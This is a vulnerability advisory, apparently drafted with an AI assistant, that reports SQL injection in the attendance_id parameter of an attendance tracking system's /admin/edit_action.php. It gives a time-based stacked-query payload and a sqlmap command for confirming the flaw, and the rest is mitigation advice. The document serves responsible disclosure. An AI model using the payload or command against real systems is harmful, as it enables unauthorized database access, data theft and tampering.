# 📝 **Vulnerability Fact Sheet**

---

## **🔍 Overview**

- **Product Name:** Attendance Tracking Management System PHP & MySQL Project
- **Version:** V1.0
- **Vulnerable File:** `/admin/edit_action.php`
- **Vulnerability Type:** SQL Injection
- **Submitter:** l1nk
- **Vendor Homepage:** [Project Management System](https://1000projects.org/attendance-tracking-management-system-php-mysql-project.html#google_vignette)
- **Download Link:** [Download Source Code](https://1000projects.org/wp-content/uploads/2022/04/Attendance-Tracking-Management-System.7z)

---

## **⚠️ Vulnerability Details**

### **📌 Description**

A critical SQL injection vulnerability has been identified in the `/admin/edit_action.php` file of the **Attendance Tracking Management System PHP & MySQL Project** (V1.0). The issue arises from insufficient validation of the `attendance_id` parameter, allowing attackers to inject malicious SQL queries directly into database operations.

### **🔧 Root Cause**

- **Unsanitized Input:** The `attendance_id` parameter is incorporated directly into SQL queries without proper sanitization or validation.
- **Direct Query Manipulation:** Attackers can manipulate the `attendance_id` parameter to alter the structure and logic of SQL statements.

### **🎯 Impact**

Exploiting this vulnerability can lead to:

- **Unauthorized Database Access:** Attackers can retrieve sensitive data.
- **Data Leakage:** Exposure of confidential information.
- **Data Tampering:** Modification or deletion of records.
- **System Control:** Potential for full system compromise.
- **Service Interruption:** Disruption of normal operations through malicious queries.

---

## **🔍 Technical Details & Proof of Concept (PoC)**

### **🛠️ Vulnerable Parameter**

- **Parameter:** `attendance_id`
- **Location:** POST request to `/admin/edit_action.php`

### **💣 Sample Payloads**

1. **Stacked queries SQL Injection**
    ```bash
    attendance_id=1';SELECT SLEEP(5)#&action=edit
    ```

### **🔍 Exploitation Steps Using sqlmap**

1. **Craft the Malicious Request:**
    ```bash
    sqlmap -u "10.211.55.6:1131/admin/edit_action.php" --data="attendance_id=1&action=edit" --batch --level=5 --risk=3
    ```

2. **Execute the Command:**
    - The above command automates the detection and exploitation of the SQL injection vulnerability.

3. **Review Results:**
    - Successful exploitation may reveal database names, tables, and sensitive data.

### **📸 Evidence**

<img width="754" alt="image" src="https://github.com/user-attachments/assets/865ec7df-90d5-430b-ae77-ca8a7dd126a8" />

---

## **🔒 Mitigation & Remediation**

1. **✅ Implement Prepared Statements & Parameter Binding**
    - **Action:** Use parameterized queries to ensure that user inputs are treated strictly as data.
    - **Benefit:** Prevents malicious SQL code from being executed.

2. **✅ Enforce Strict Input Validation & Sanitization**
    - **Action:** Validate and sanitize all user inputs, especially the `attendance_id` parameter, to conform to expected formats and types.
    - **Benefit:** Reduces the risk of injection attacks by eliminating unexpected or harmful input.

3. **✅ Apply the Principle of Least Privilege**
    - **Action:** Restrict database user permissions to the minimum necessary for application functionality. Avoid using high-privilege accounts (e.g., `root`, `admin`) for routine operations.
    - **Benefit:** Limits the potential damage if an attacker gains database access.

4. **✅ Conduct Regular Security Audits**
    - **Action:** Perform periodic code reviews and security assessments to identify and remediate vulnerabilities promptly.
    - **Benefit:** Ensures ongoing application security and adherence to best practices.

---

## **📚 Additional Resources**

- **Vendor Homepage:** [Project Management System](https://1000projects.org/attendance-tracking-management-system-php-mysql-project.html#google_vignette)
- **OWASP SQL Injection Overview:** [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- **sqlmap Documentation:** [sqlmap](https://sqlmap.org/)

---

## **📜 Disclaimer**

This fact sheet is intended for responsible disclosure purposes. Unauthorized exploitation or distribution of this vulnerability information is prohibited and may result in legal consequences. The vendor is strongly advised to implement the recommended fixes immediately to safeguard user data and maintain system integrity.

---

**End of Fact Sheet**

---

If you need further customization or a different formatting style, feel free to let me know!
